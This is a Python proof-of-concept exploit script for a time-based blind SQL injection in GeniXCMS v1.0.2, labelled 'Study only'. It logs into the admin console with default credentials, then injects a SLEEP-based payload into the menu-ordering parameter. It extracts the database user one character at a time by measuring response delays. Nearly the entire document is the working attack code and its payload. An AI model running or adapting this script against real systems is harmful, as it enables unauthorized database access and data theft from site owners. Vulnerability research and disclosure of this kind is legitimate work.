#!/usr/bin/python

'''
This is a demo POC to exploit the time-based blind SQL injection vulnerability (inc/lib/Control/Backend/menus.control.php) in latest GeniXCMS v1.0.2.
Study only...
'''

import requests
import time

# Set proxy
proxies = {'http': 'http://127.0.0.1:8080'}

# First access this URL inorder to get cookie and token for admin login.
login_url = 'http://10.1.1.132/genixcms/gxadmin/login.php'

print '[*] Fresh token obtaining ...'

r1 = requests.get(login_url)
index1 = r1.text.find('token')
token1 = r1.text[index1+14:index1+94]

# Now we will login to admin console
print '[!] Fresh token obtained: ' + token1
print '[*] Logging in as admin ...'

# Set Admin username and password
admin_username = 'admin'
admin_password = 'admin'

payload1 = {'username': admin_username, 'password': admin_password, 'token': token1, 'login': ''} 

r2 = requests.post(login_url, data = payload1, cookies = r1.cookies)
index2 = r2.text.find('token')
token2 = r2.text[index2+6:index2+86]

print '[!] Admin login succeeded!'
print '[*] Start blind SQL injecting (select user())...'

# Now we are admin, and then we are going to exploit the SQL injection vulnerability
# Set sleep() delay time
delay_time = '3'
exp_url = 'http://10.1.1.132/genixcms/gxadmin/index.php?page=menus'
new_token = token2
found_rst = ''

# Start loop to do time-based blind SQL injection to burte force the DB user()
for x in range(1,100):
	is_all_found = True
	for y in range(33,126):		
		# Set the SQL injection payload, in this case, using select user() to obtain the current DB user
		sqli_payload = 'order[0][order`=1 and (select * from (select(if(ascii(substr((select user()),' + str(x) + ',1))=' + str(y) + ',sleep(' + delay_time + '),0)))a) and `name]'
		
		payload2 = {'token': new_token, sqli_payload: '1', 'changeorder': '1'}

		new_r = requests.post(exp_url, data = payload2, cookies = r2.cookies)

		new_index = new_r.text.find('token')
		new_token = new_r.text[new_index+6:new_index+86]

		if int(new_r.elapsed.total_seconds()) >= 1:
			found_rst += chr(y)
			is_all_found = False
			print '[!] ' + str(x) + ' bit found: ' + found_rst
			break
	if is_all_found == True:
		break

print '[!] User Found:' + found_rst